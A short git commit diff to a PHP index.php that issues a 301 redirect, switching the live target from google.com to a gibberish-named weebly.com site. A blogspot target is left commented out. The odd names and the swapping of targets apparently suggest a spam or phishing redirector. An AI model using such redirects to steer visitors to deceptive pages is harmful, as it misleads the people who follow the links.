962744ffb21df0acbe228ef33b044c6615ebc22d
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-09-06 23:58:26 -0400

    Update index.php

--- supermosterin/friaslesteriani/index.php
+++ supermosterin/friaslesteriani/index.php
@@ -6,7 +6,7 @@ Header( "HTTP/1.1 301 Moved Permanently" );
 
 
 //Header( "Location: https://sombrillamasterialespaww.blogspot.com/");
-//Header( "Location: https://elsproanlienaterialimasterial.weebly.com/");
-Header( "Location: https://google.com");
+Header( "Location: https://elsproanlienaterialimasterial.weebly.com/");
+//Header( "Location: https://google.com");
 
 ?>
